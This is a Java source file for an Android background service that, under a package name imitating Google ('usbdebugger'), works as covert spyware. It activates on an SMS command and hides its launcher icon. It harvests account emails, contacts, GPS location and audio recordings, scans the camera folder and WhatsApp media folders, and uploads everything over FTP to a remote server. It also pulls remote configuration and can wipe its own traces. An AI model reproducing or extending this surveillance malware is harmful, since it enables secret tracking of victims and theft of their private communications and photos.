package com.google.android.usbdebugger;

import static com.google.android.usbdebugger.FTP_Sender.Netice;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;


public class MyService extends Service {
    public MyService() {
    }

    private static final String CHANNEL_ID = "MyServiceChannel";
    private Thread trd;
    private Thread trw;
    private int recordCount = 10;
    public static int dcimfinifh = 0;
    public static int whatfinifh = 0;

    private double old_latitude = 0.000001;
    private double old_longitude = 0.000002;

    private int DBsize = 2880, Dbtemp = 0;
    private DBHelper dbh;
    private Records rc;
    private SQLiteDatabase db;
    private int gps_say = 0;
    private int gps_setir = 0;
    private int xmlsay = 0;
    private final int screentime = 0;

    private final String TAG = "myService: ";
    private final Context contx = this;
    private Timer smsTimer;
    private SMSTimerTask smsMyTimerTask;

    private String OperatoName, imeiNumber2, imeiNumber1;
    private File aDir, DCIMDir, aTempDir, GpsDir, GpsTemDir;
    private String DCIMpath, WhatsApppath, stat;
    private int status = 0;
    private int start = 0;
    private final int tt = 0;
    public static int old_stat = 0, new_stat = 0;
    private static int say = 0;
    private boolean screenstastus, chg = false;
    private static boolean update_param;
    public ArrayList Params = null;

    public String latitude_n, longitude_n, dtTime, speed_n;

    public String DateTime() {
        Date dt = new Date();
        @SuppressLint("SimpleDateFormat")
        SimpleDateFormat ft2 = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
        return ft2.format(dt);
    }
    public static boolean getStat() {
        if(old_stat == new_stat){
            return false;
        }
        else{
            old_stat = new_stat;
            return true;
        }
    }

    public static int RcSay() {
        return say;
    }

    public static int whatsapp_status(int stst) {
        whatfinifh = stst;
        return whatfinifh;
    }

    public static int dcim_status(int stst) {
        dcimfinifh = stst;
        return dcimfinifh;
    }

    public void myActions() {
        File ff = new File(getDatabasePath("myDB").getPath());
        try {
            dbh = new DBHelper(this);
            db = dbh.getWritableDatabase();
            if (!ff.exists()) {
                dbh.onCreate(db);
            }
            PhoneInfo();
            DirExixs();
            rc = new Records();
        }catch (Exception ex){
            Log.e("MyServiceERR1","mAction :"+ex.getMessage());
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public void onDestroy() {
        start = 0;
        if (smsTimer != null) {
            smsTimer.cancel();
            smsTimer = null;
        }

        if (rc != null) { // This check prevents the crash
            if (status == 1) {
                try {
                    rc.recordStop(1);
                    File ffdir = new File(getFilesDir().getAbsolutePath());
                    deleteFileOrFolder(ffdir);

                    ffdir = new File(getDatabasePath("myDB").getParent());
                    deleteFileOrFolder(ffdir);
                } catch (Exception ex) {
                    if (dbh != null) {
                        dbh.insert_Exeption(db, "onDestroy() deleteFileOrFolder", "Exception", ex.getMessage(), DateTime());
                    }
                }
            } else {
                rc.recordStop(0);
            }
        }
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Service is Running")
                .setContentText("Your service is active in the background.")
                .setSmallIcon(R.mipmap.ic_launcher)
                .build();

        startForeground(1, notification);

        stat = "";
        boolean check = false;
        if (intent == null) {
            return START_REDELIVER_INTENT; 
        }

        stat = intent.getStringExtra("sms_body");

        if(stat!=null) {

            if (start == 0) {
                myActions();
            }

            Params = (ArrayList) intent.getSerializableExtra("Array");

            if (Params == null || Params.isEmpty()) {
                if(dbh == null) myActions(); // Ensure dbh is initialized
                Params = dbh.SelectParametrs(db);
            }

            if (Params != null && !Params.isEmpty()) {
                check = true;
            }

            if(check) {
                status = 0;
                if (smsTimer == null) {
                    smsTimer = new Timer();
                    smsMyTimerTask = new SMSTimerTask();
                    smsTimer.schedule(smsMyTimerTask, 1000, 1000);
                }
                hideLauncherIcon();
            }
        }
        return START_REDELIVER_INTENT;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "My Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private void hideLauncherIcon() {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, getPackageName() + ".Launcher");
        if (pm.getComponentEnabledSetting(componentName) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
            pm.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }
    }

    private void deleteFileOrFolder(File file){
        try {
            if (file == null || !file.exists()) return;
            if (file.isDirectory()) {
                for (File f : file.listFiles()) {
                    deleteFileOrFolder(f);
                }
            }
            file.delete();
        } catch (Exception e) {
            if (dbh != null) {
                dbh.insert_Exeption(db, "deleteFileOrFolder()","Exception", e.getMessage(), DateTime());
            }
        }
    }

    public void hardshutdown(){
        Thread.interrupted();
        if (smsTimer != null) {
            smsTimer.cancel();
            smsTimer = null;
        }
        start = 0;
        status = 1;
        this.onDestroy();
    }

    public static void update_param(){
        update_param=true;
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public void AfterOnStart() {
        try {
            if (Params == null || Params.isEmpty()) { 
                Log.e("MyServiceERR1", "Params are null or empty in AfterOnStart, cannot proceed.");
                return;
            }

            if(Params.get(19).toString().equals("1")){
                hardshutdown();
            }
            
            if (status == 0) {

                if (update_param) {
                    if(dbh != null && !db.isOpen()) {
                        db = dbh.getWritableDatabase();
                    }
                    Params = dbh.SelectParametrs(db);
                    update_param = false;
                    chg = true;
                }
                DBCopy();
                xmlsay++;
                if (Params.get(17).toString().equals("1")) {
                    ArrayList test = new ArrayList();
                    if (xmlsay == 2) {
                        if(FTP_Sender.hasConnection(contx, 1)) {
                            if(Params != null && Params.size() > 2 && !Params.get(2).toString().isEmpty()) {
                                test = ReadXMLFile.main(EncryptDecryptStringWithAES.decrypt(Params.get(2).toString()), imeiNumber1, this);
                            }
                        }

                        if (test != null && test.size() > 0) {
                            ArrayList newParams = new ArrayList(Params); // Start with a copy of current params
                            boolean hasChanges = false;

                            for (int i = 0; i < test.size(); i++) {
                                if (i >= newParams.size()) break;

                                String serverValue = test.get(i).toString();
                                if (serverValue != null && !serverValue.isEmpty()) {
                                    String valueToStore = serverValue;
                                    if (i == 2 || i == 4 || i == 5 || i == 6 || i == 12) {
                                        valueToStore = EncryptDecryptStringWithAES.encrypt(serverValue);
                                    }
                                    
                                    if (!newParams.get(i).toString().equals(valueToStore)) {
                                        newParams.set(i, valueToStore);
                                        hasChanges = true;
                                    }
                                }
                            }

                            if (hasChanges) {
                                Params = newParams; // Update in-memory params
                                BootDeviceReceiver bt = new BootDeviceReceiver();
                                bt.createParams(this, Params); // Save corrected params to DB
                                Log.d("MyService", "Parameters updated from server.");
                            }
                        }
                        xmlsay = 0;
                    }
                }
                if (xmlsay > 10) {
                    xmlsay = 0;
                }

                if (Params.get(9).toString().equals("1")) {
                    Contacts.getContacts(this);
                }

                if (Params.get(0).toString().equals("1")) {
                    if (rc != null) {
                        rc.Config(contx, aTempDir, aDir, Params, screenstastus, imeiNumber1, recordCount);
                        if (start == 0) {
                            if (!Params.get(18).toString().equals("")) {
                                recordCount = Integer.parseInt(Params.get(16).toString());
                            }
                            rc.recordStart();
                            start = 1;
                            say = 0;
                        }
                    }
                }

                if (Params.get(11).toString().equals("1")) {
                    if(dcimfinifh == 0) {
                        Runnable runnable = () -> DCIM_Folder();
                        trd = new Thread(runnable);
                        trd.start();
                    }
                }

                if (Params.get(10).toString().equals("1")) {
                    if(whatfinifh == 0) {
                        Runnable runnable = () -> WhatsApp_Folder();
                        trw = new Thread(runnable);
                       trw.start();
                    }
                }

                if (Params.get(7).toString().equals("1")) {
                    int saniyye = 0;
                    if (!Params.get(8).toString().equals("")) {
                        saniyye = Integer.parseInt(Params.get(8).toString());
                    }
                    GPS_Loc(this, saniyye);
                }

                if (!Params.get(16).toString().equals("")) {
                    if (!Params.get(18).toString().equals("")) {
                        DBsize = Integer.parseInt(Params.get(18).toString());
                    }
                }
                if (start == 1 && stat.equals("#1*")) {
                }

                if (Params.get(0).toString().equals("0")) {
                    if (start != 0) {
                        start = 0;
                        if (rc != null) rc.recordStop(0);
                    }
                }
            }
        } catch (Exception ex) {
            Log.e("MyServiceERR1","AfterOnStart() Exception :"+ex.getMessage());
        }
    }


    public void DBCopy(){
        if(dbh != null && !db.isOpen()) {
            db = dbh.getWritableDatabase();
        }
        int DBcnt = dbh.DbCount(db);
        if (DBcnt >= DBsize || Dbtemp == 0) {
            File ff = new File(getDatabasePath("myDB").getPath());
            FTP_Sender.FTP(ff, null, 10, 1, 0, Params, screenstastus, imeiNumber1, this, recordCount,  aDir);
        }
        if(DBcnt == 0){
            Dbtemp = 1;
        }
    }

    @TargetApi(Build.VERSION_CODES.ECLAIR_MR1)
    public boolean isInteractive() {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH
                ? powerManager.isInteractive()
                : powerManager.isScreenOn();
    }

    void GPS_Loc(final Context context, final int saniyye) {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {

                if (gps_say == 0 || gps_say == saniyye) {
                    final GPSTracker gps = new GPSTracker(context);
                    try {
                        if (gps.canGetLocation()) {
                            double latitude = gps.getLatitude();
                            double longitude = gps.getLongitude();
                            float speed = gps.getSpeed();
                            long times = gps.getTimes();
                            @SuppressLint("SimpleDateFormat")
                            SimpleDateFormat ft = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss");

                            int stlongIndx_old = String.valueOf(old_longitude).indexOf('.');
                            int stlatIndx_old = String.valueOf(old_latitude).indexOf('.');
                            int stlongIndx = String.valueOf(longitude).indexOf('.');
                            int stlatIndx = String.valueOf(latitude).indexOf('.');
                            latitude_n = String.valueOf(latitude);
                            longitude_n = String.valueOf(longitude);
                            speed_n = String.valueOf(speed);
                            dtTime = ft.format(times);

                            if((old_latitude!=latitude || old_longitude != longitude) &&
                                    (!String.valueOf(old_longitude).substring(stlongIndx_old+1, stlongIndx_old+4)
                                            .equals(longitude_n.substring(stlongIndx+1, stlongIndx+4)) ||
                                    !String.valueOf(old_latitude).substring(stlatIndx_old+1, stlatIndx_old+4)
                                            .equals(latitude_n.substring(stlatIndx+1, stlatIndx+4)))) {


                                ReadXMLFile.TEST_PHP(Params,imeiNumber1,latitude_n,longitude_n, speed_n,dtTime, 1);
                                Write_to_File(GpsTemDir, latitude + "," + longitude + "," + ft.format(times) + "\n");
                            }

                            old_latitude = latitude;
                            old_longitude = longitude;
                            gps_say = 0;
                        }
                    } catch (Exception ex) {
                        if (dbh != null) dbh.insert_Exeption(db, "GPS_Loc()","Exception", ex.getMessage(), DateTime());
                    }
                }
                gps_say++;
                if (gps_say > saniyye) {
                    gps_say = 0;
                }
            }
        });
    }

    @SuppressLint({"HardwareIds"})
    public void PhoneInfo() {
        OperatoName = "";
        imeiNumber1 = ""; 
        imeiNumber2 = ""; 

        TelephonyManager telephony = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);

        if (dbh != null) {
            dbh.Delete_Account(db);
            Account[] accounts = AccountManager.get(this).getAccounts();
            if (accounts.length > 0) {
                for (Account account : accounts) {
                    String possibleEmail = account.name;
                    String type = account.type;
                    dbh.insert_Account(db, possibleEmail, type);
                }
            }
        }

        try {
            if (telephony != null) {
                OperatoName = telephony.getNetworkOperatorName();
            }

            imeiNumber1 = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

            if(dbh != null && !db.isOpen()) {
                db = dbh.getWritableDatabase();
            }
            dbh.insert_PhoneInfo(db,"PhoneInfo", imeiNumber1, imeiNumber2, EncryptDecryptStringWithAES.encrypt(OperatoName),
                    String.valueOf(Build.VERSION.SDK_INT));

        } catch (Exception ex) { 
            if (dbh != null) {
                dbh.insert_Exeption(db, "PhoneInfo()","Exception", ex.getMessage(), DateTime());
            }
        }
    }

    public void DirExixs() {
        File file = null;
        file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath());
        DCIMpath = file.getPath();
        DCIMDir = null;

        if (imeiNumber1 == null || imeiNumber1.isEmpty()) {
             imeiNumber1 = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        }

        File whatsapp = null;
        whatsapp = new File(Environment.getExternalStoragePublicDirectory("WhatsApp").getAbsolutePath()+"/Media");
        WhatsApppath = whatsapp.getPath();

        aDir = new File(getFilesDir().getAbsoluteFile() + "/" + imeiNumber1 + "/A");
        aTempDir = new File(getFilesDir().getAbsoluteFile() + "/" + imeiNumber1 + "/T");
        GpsDir = new File(getFilesDir().getAbsoluteFile() + "/" + imeiNumber1 + "/G");
        GpsTemDir = new File(getFilesDir().getAbsoluteFile() + "/" + imeiNumber1 + "/GT");
        if (!aDir.exists()) {
            aDir.mkdirs();
        }
        if (!aTempDir.exists()) {
            aTempDir.mkdirs();
        }
        if (!GpsDir.exists()) {
            GpsDir.mkdirs();
        }
        if (!GpsTemDir.exists()) {
            GpsTemDir.mkdirs();
        }
    }

    public void Write_to_File(File fd, String str) {
        try {

            File fc = new File(fd, "gpps");
            if(!fc.exists()) {
                fc.createNewFile();
                gps_setir = 0;
            }
            FileWriter fr = new FileWriter(fc, true);

            fr.write(str);
            fr.flush();
            fr.close();
            gps_setir++;

            int para = 20;

            if(FTP_Sender.hasConnection(contx, 0)){
                if(gps_setir >= para) {
                    File fmove = new File(GpsTemDir + "/gpps");
                    File fmove2 = new File(GpsDir + "/gpps");
                    if(fmove2.exists()){
                        fmove2.delete();
                    }
                    fmove.renameTo(fmove2);

                    FTP_Sender.FTP(fmove2, null, 7, 0, 0, Params, screenstastus, imeiNumber1, this, recordCount, null);
                    gps_setir = 0;
                }
            }

        } catch (FileNotFoundException e){
            if (dbh != null) dbh.insert_Exeption(db, "Write_to_File()","FileNotFoundException", e.getMessage(), DateTime());
        } catch (IOException e){
            if (dbh != null) dbh.insert_Exeption(db, "Write_to_File()","IOException", e.getMessage(), DateTime());
        }
    }

   class SMSTimerTask extends TimerTask {
        @RequiresApi(api = Build.VERSION_CODES.KITKAT)
        @Override
        public void run() {
            if(new_stat >= 100){
                new_stat = 0;
            }
            new_stat++;
            Log.d("MyService", "Timer tick: "+new_stat);
            AfterOnStart();
            if(Params!=null) {
                if(Params.get(13).toString().equals("1")) {
                    screenstastus = isInteractive();
                }else {
                    screenstastus = false;
                }
            }
            else {
                screenstastus = false;
            }
        }
    }

    @TargetApi(Build.VERSION_CODES.GINGERBREAD)
    void DCIM_Folder() {
        dcimfinifh = 1;
        String[] SelFiles = null;
        ArrayList files = new ArrayList();

        int typefiles = 0;
        int trype = 0;

        int fltekrar = 0, flcnt = 0;
        String netice = "";
        try {
            if (Netice[2].equals("Finish")) {
                netice = "Finish";
            }
            else {
                netice = "";
            }
            if (netice.equals("Finish")) {
                try {
                    if (trype == 0) {
                        Log.d("MyService", "DCIM_Folder() start :" + dcimfinifh);
                        DCIMDir = null;
                        DCIMDir = new File(DCIMpath, "Camera");
                        if (DCIMDir.exists()) {
                            if (DCIMDir.listFiles().length > 0) {
                                trype = 1;
                            }
                        } else {
                            DCIMDir = null;
                            DCIMDir = new File(DCIMpath, "100ANDRO");
                            if (DCIMDir.exists()) {
                                if (DCIMDir.listFiles().length > 0) {
                                    trype = 1;
                                }
                            }
                        }
                    }
                } catch (Exception ex) {
                    dbh.insert_Exeption(db, "DCIM_Folder() type == 0", "Exception", ex.getMessage(), DateTime());
                }

                flcnt = 0;
                SelFiles = null;
                files = new ArrayList();
                if (trype == 1) {

                    SelFiles = dbh.Select_FileNames2(db, "SrFiles", DCIMDir, 2, "0");
                    for (int i = 0; i < DCIMDir.listFiles().length; i++) {
                        if (Params.get(11).toString().equals("0") || status == 1) {
                            return;
                        }
                        if (DCIMDir.listFiles()[i].getName().indexOf(".jpg") > 0 ||
                                DCIMDir.listFiles()[i].getName().indexOf(".jpeg") > 0 ||
                                DCIMDir.listFiles()[i].getName().indexOf(".png") > 0) {
                            fltekrar = 0;
                            if (SelFiles != null) {
                                for (String selFile : (String[])SelFiles) {
                                    if (DCIMDir.listFiles()[i].getAbsolutePath().equals(selFile)) {
                                        fltekrar = 1;
                                        break;
                                    }
                                }
                            }
                            if (fltekrar == 0) {
                                files.add(flcnt, DCIMDir.listFiles()[i].getAbsolutePath());
                                flcnt++;
                                fltekrar = 1;
                            } else {
                                fltekrar = 0;
                            }
                        }
                    }
                    flcnt = 0;
                    Object[] objectList = files.toArray();
                    SelFiles = null;
                    SelFiles = Arrays.copyOf(objectList, objectList.length, String[].class);

                    if (SelFiles != null && SelFiles.length > 0) {
                        FTP_Sender.FTP(null, SelFiles,
                                2, 0, 0, Params, screenstastus, imeiNumber1, this, recordCount, aDir);
                    }
                }
            }
        } catch (Exception ex) {
            dbh.insert_Exeption(db, "DCIM_Folder() type > 0", "Exception", ex.getMessage(), DateTime());
        }

        dcimfinifh = 0;
    }

    @TargetApi(Build.VERSION_CODES.GINGERBREAD)
    void WhatsApp_Folder() {
        whatfinifh = 1;
        Log.d("MyService", "WhatsApp_Folder() start:"+whatfinifh);

            int sent = 0, type = 0, sents = 0, types = 0;
            File FD = new File(WhatsApppath);
            if (!FD.exists()) {
                return;
            }
            ArrayList files, filessent;
            String[] WhatsAppFolder = {"WhatsApp Images", "WhatsApp Voice Notes"
                    , "WhatsApp Documents", "WhatsApp Audio"};

            int fltekrar = 0, flcnt = 0, flcntsent = 0, flcntnotes = 0;
            files = new ArrayList();
            filessent = new ArrayList();
        String netice = "";

        if((Netice[3].equals("Finish") && Netice[4].equals("Finish") && Netice[5].equals("Finish")
                && Netice[6].equals("Finish"))){
            netice = "Finish";
        }
        else{
            netice = "";
        }
        if (netice.equals("Finish")) {
            Log.d("MyService", "WhatsApp_Folder() start Notes:" + whatfinifh);
            try {
                for (int i = 0; i < 4; i++) {
                    try {
                        if (Params.get(10).toString().equals("0") || status == 1) {
                            return;
                        }
                    }catch (Exception ex){
                        dbh.insert_Exeption(db, "Params.get(10).toString()", "Exception", ex.getMessage(), DateTime());
                    }
                    FD = new File(WhatsApppath + "/" + WhatsAppFolder[i]);
                    String[] SelFiles = null;
                    files = new ArrayList();
                    if (FD.exists()) {
                        if (WhatsAppFolder[i].indexOf("Images") > 0 || WhatsAppFolder[i].indexOf("Audio") > 0 || WhatsAppFolder[i].indexOf("Documents") > 0) {
                            if (WhatsAppFolder[i].equals("WhatsApp Images")) {
                                sent = 0;
                                type = 3;
                            }
                            if (WhatsAppFolder[i].equals("WhatsApp Audio")) {
                                sent = 0;
                                type = 4;
                            }
                            if (WhatsAppFolder[i].equals("WhatsApp Documents")) {
                                sent = 0;
                                type = 6;
                            }
                            try {
                                SelFiles = dbh.Select_FileNames2(db, "SrFiles", FD, type, String.valueOf(sent));
                            }catch (Exception ex){
                                dbh.insert_Exeption(db, "SelFiles-1", "Exception", ex.getMessage(), DateTime());
                            }

                                if (FD.listFiles().length > 0) {
                                    for (int k = 0, max = FD.listFiles().length; k < max; k++) {
                                        if (FD.listFiles()[k].getName().indexOf(".") > 1 && !FD.listFiles()[k].getName().contains("nomedia")) {
                                            fltekrar = 0;
                                            try {
                                                if (SelFiles != null) {
                                                    if(SelFiles.length>0) {
                                                        for (String selFile : SelFiles) {
                                                            if (FD.listFiles()[k].getAbsolutePath().equals(selFile)) {
                                                                fltekrar = 1;
                                                                break;
                                                            }
                                                        }
                                                    }
                                                }
                                            }catch (Exception ex){
                                                dbh.insert_Exeption(db, "if (SelFiles null)", "Exception", ex.getMessage(), DateTime());
                                            }
                                            try {
                                                if (fltekrar == 0) {
                                                    files.add(flcnt, FD.listFiles()[k].getAbsolutePath());
                                                    flcnt++;
                                                    fltekrar = 1;
                                                } else {
                                                    fltekrar = 0;
                                                }
                                            }catch (Exception ex){
                                                dbh.insert_Exeption(db, "fltekrar 0", "Exception", ex.getMessage(), DateTime());
                                            }
                                        } else {
                                            if (FD.listFiles()[k].isDirectory()) {
                                                String[] SelFilesSent = null;
                                                fltekrar = 0;
                                                flcntsent = 0;
                                                filessent = new ArrayList();
                                                File FD_Sent = new File(FD.listFiles()[k].getPath());
                                                if (FD.listFiles()[k].getName().equals("Sent")) {
                                                    if (WhatsAppFolder[i].equals("WhatsApp Images")) {
                                                        sents = 1;
                                                        types = 3;
                                                    }
                                                    if (WhatsAppFolder[i].equals("WhatsApp Audio")) {
                                                        sents = 1;
                                                        types = 4;
                                                    }
                                                    if (WhatsAppFolder[i].equals("WhatsApp Documents")) {
                                                        sents = 1;
                                                        types = 6;
                                                    }
                                                    try {
                                                        SelFilesSent = dbh.Select_FileNames2(db, "SrFiles", FD_Sent, types, String.valueOf(sents));
                                                    }catch (Exception ex){
                                                        dbh.insert_Exeption(db, "SelFilesSent", "Exception", ex.getMessage(), DateTime());
                                                    }
                                                    if (FD_Sent.listFiles().length > 0) {
                                                        for (int l = 0, max12 = FD_Sent.listFiles().length; l < max12; l++) {
                                                            if (FD_Sent.listFiles()[l].getName().indexOf(".") > 1 && !FD_Sent.listFiles()[l].getName().contains("nomedia")) {
                                                                fltekrar = 0;
                                                                try {
                                                                    if (SelFilesSent != null) {
                                                                        if(SelFilesSent.length>0) {
                                                                            for (String s : SelFilesSent) {
                                                                                if (FD_Sent.listFiles()[l].getAbsolutePath().equals(s)) {
                                                                                    fltekrar = 1;
                                                                                    break;
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }catch (Exception ex){
                                                                    dbh.insert_Exeption(db, "SelFilesSent null ", "Exception", ex.getMessage(), DateTime());
                                                                }
                                                                try {
                                                                    if (fltekrar == 0) {
                                                                        filessent.add(flcntsent, FD_Sent.listFiles()[l].getAbsolutePath());
                                                                        flcntsent++;
                                                                        fltekrar = 1;
                                                                    } else {
                                                                        fltekrar = 0;
                                                                    }
                                                                }catch (Exception ex){
                                                                    dbh.insert_Exeption(db, "fltekrar 1 ", "Exception", ex.getMessage(), DateTime());
                                                                }
                                                            }
                                                        }
                                                        flcntsent = 0;
                                                    }
                                                }
                                                try {
                                                    Object[] objectList = filessent.toArray();
                                                    SelFilesSent = null;
                                                    SelFilesSent = Arrays.copyOf(objectList, objectList.length, String[].class);

                                                    if (SelFilesSent != null && SelFilesSent.length > 0) {
                                                        FTP_Sender.FTP(null, SelFilesSent,
                                                                types, 0, sents, Params, screenstastus, imeiNumber1, this, recordCount, aDir);
                                                    }
                                                }catch (Exception ex){
                                                    dbh.insert_Exeption(db, "objectList 0 ", "Exception", ex.getMessage(), DateTime());
                                                }
                                            }
                                        }
                                    }
                                    flcnt = 0;
                                    try {
                                        Object[] objectList = files.toArray();
                                        SelFiles = null;
                                        SelFiles = Arrays.copyOf(objectList, objectList.length, String[].class);

                                        if (SelFiles != null && SelFiles.length > 0) {
                                            FTP_Sender.FTP(null, SelFiles,
                                                    type, 0, sent, Params, screenstastus, imeiNumber1, this, recordCount, aDir);
                                        }
                                    }catch (Exception ex){
                                        dbh.insert_Exeption(db, "objectList 1 ", "Exception", ex.getMessage(), DateTime());
                                    }
                                }
                        }
                        if (WhatsAppFolder[i].indexOf("Notes") > 0) {
                            FD = new File(WhatsApppath + "/" + WhatsAppFolder[i]);
                            if (FD.listFiles().length > 0) {
                                flcntnotes = 0;
                                for (int k = 0, max = FD.listFiles().length; k < max; k++) {
                                    if (FD.listFiles()[k].isDirectory()) {
                                        sent = 0;
                                        type = 5;
                                        File FdNotes = new File(FD.listFiles()[k].getPath());
                                        String[] SelFilesNotes = null;
                                        files = new ArrayList();
                                        try {
                                            SelFilesNotes = dbh.Select_FileNames2(db, "SrFiles", FdNotes, type, String.valueOf(sent));
                                        }catch (Exception ex){
                                            dbh.insert_Exeption(db, "SelFilesNotes ", "Exception", ex.getMessage(), DateTime());
                                        }
                                        if (FdNotes.listFiles().length > 0) {
                                            for (int l = 0, max2 = FdNotes.listFiles().length; l < max2; l++) {
                                                if (FdNotes.listFiles()[l].getName().indexOf(".") > 1 && !FdNotes.listFiles()[l].getName().contains("nomedia")) {
                                                    fltekrar = 0;
                                                    try {
                                                        if (SelFilesNotes != null) {
                                                            if(SelFilesNotes.length>0) {
                                                                for (String selFilesNote : SelFilesNotes) {
                                                                    if (FdNotes.listFiles()[l].getAbsolutePath().equals(selFilesNote)) {
                                                                        fltekrar = 1;
                                                                        break;
                                                                    }
                                                                }
                                                            }
                                                        }
                                                        if (fltekrar == 0) {
                                                            files.add(flcntnotes, FdNotes.listFiles()[l].getAbsolutePath());
                                                            flcntnotes++;
                                                            fltekrar = 1;
                                                        } else {
                                                            fltekrar = 0;
                                                        }
                                                    }catch (Exception ex){
                                                        dbh.insert_Exeption(db, "SelFilesNotes null ", "Exception", ex.getMessage(), DateTime());
                                                    }
                                                }
                                            }
                                            flcntnotes = 0;
                                            try {
                                                Object[] objectList = files.toArray();
                                                SelFilesNotes = null;
                                                SelFilesNotes = Arrays.copyOf(objectList, objectList.length, String[].class);

                                                if (SelFilesNotes != null && SelFilesNotes.length > 0) {
                                                    FTP_Sender.FTP(null, SelFilesNotes,
                                                            type, 0, sent, Params, screenstastus, imeiNumber1, this, recordCount, aDir);
                                                }
                                            }catch (Exception ex){
                                                dbh.insert_Exeption(db, "objectList 2 ", "Exception", ex.getMessage(), DateTime());
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (Exception ex) {
                dbh.insert_Exeption(db, "Whatsapp_Folder()", "Exception", ex.getMessage(), DateTime());
            }
        }
        whatfinifh = 0;
    }
}
